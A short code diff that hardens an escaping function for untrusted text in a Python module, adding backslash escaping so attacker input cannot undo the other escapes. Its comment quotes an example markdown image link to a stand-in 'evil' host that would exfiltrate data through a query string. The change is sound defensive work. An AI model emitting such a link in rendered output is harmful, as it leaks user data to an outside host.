@@ -25,10 +25,12 @@ class UntrustedText(BaseModel):
 
 
 def _escape(text: str) -> str:
-    # ``&`` first so the entities added below are not double-escaped; ``[``/``]`` so a
+    # ``&`` first so the entities added below are not double-escaped, then ``\`` so an
+    # attacker's own backslash cannot cancel the escapes added below; ``[``/``]`` so a
     # link or image (``![x](https://evil/?q=...)``) cannot render and exfiltrate data.
     return (
         text.replace("&", "&amp;")
+        .replace("\\", "\\\\")
         .replace("`", "\\`")
         .replace("<", "&lt;")
         .replace(">", "&gt;")
